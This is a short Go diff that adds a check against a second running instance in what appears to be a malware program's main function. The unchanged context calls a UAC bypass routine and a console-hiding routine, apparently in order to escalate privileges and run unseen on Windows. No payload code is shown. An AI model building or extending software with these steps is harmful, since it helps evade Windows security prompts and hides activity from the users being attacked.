@@ -37,6 +37,10 @@ func main() {
 		},
 	}
 
+	if program.IsAlreadyRunning() {
+		return
+	}
+
 	uacbypass.Run()
 
 	hideconsole.Run()
